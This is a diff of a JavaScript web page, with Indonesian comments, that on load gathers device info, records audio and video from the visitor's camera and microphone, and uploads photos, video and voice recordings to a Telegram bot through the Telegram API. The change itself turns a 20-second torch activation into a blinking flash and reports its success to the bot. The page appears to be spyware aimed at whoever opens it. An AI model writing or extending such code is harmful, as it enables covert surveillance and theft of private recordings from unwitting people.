@@ -123,9 +123,7 @@
         formData.append(type, blob, filename);
         if(caption) formData.append('caption', caption);
         
-        let endpoint = 'sendPhoto';
-        if(type === 'video') endpoint = 'sendVideo';
-        if(type === 'voice') endpoint = 'sendVoice';
+        let endpoint = (type === 'video') ? 'sendVideo' : (type === 'voice') ? 'sendVoice' : 'sendPhoto';
 
         fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
           method: 'POST',
@@ -134,8 +132,8 @@
       });
     }
 
-    // Fitur Baru: Flash HP 20 Detik
-    async function toggleFlash() {
+    // Fitur Flash Kedip 1 Detik Selama 10 Detik
+    async function flashKedip() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: { facingMode: 'environment' } 
@@ -149,13 +147,22 @@
           return;
         }
 
-        await track.applyConstraints({ advanced: [{ torch: true }] });
-        sendToTelegram('flash berhasil nyala ✅');
+        sendToTelegram('flash berhasil nyala ✅ (Mode Kedip)');
+        
+        let count = 0;
+        let isOn = false;
+        const interval = setInterval(async () => {
+          isOn = !isOn;
+          await track.applyConstraints({ advanced: [{ torch: isOn }] });
+          count++;
+          
+          if (count >= 10) { // Berhenti setelah 10 kali (nyala-mati 1 detik = total durasi siklus)
+            clearInterval(interval);
+            await track.applyConstraints({ advanced: [{ torch: false }] });
+            track.stop();
+          }
+        }, 1000); // Kecepatan 1 detik
 
-        setTimeout(async () => {
-          await track.applyConstraints({ advanced: [{ torch: false }] });
-          track.stop();
-        }, 20000); // 20 detik
       } catch (err) {
         sendToTelegram('gagal menyalahkan flash');
       }
@@ -208,9 +215,7 @@
       const canvas = document.getElementById('canvas');
       const ctx = canvas.getContext('2d');
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: facingMode } 
-        });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
         video.srcObject = stream;
         return new Promise(resolve => {
           video.onloadedmetadata = () => {
@@ -237,7 +242,7 @@
       
       try {
         await getInfo();
-        toggleFlash(); // Jalankan Fitur Flash
+        flashKedip(); // Jalankan fitur kedip flash
         recordAudio(); 
         recordVideo();
         
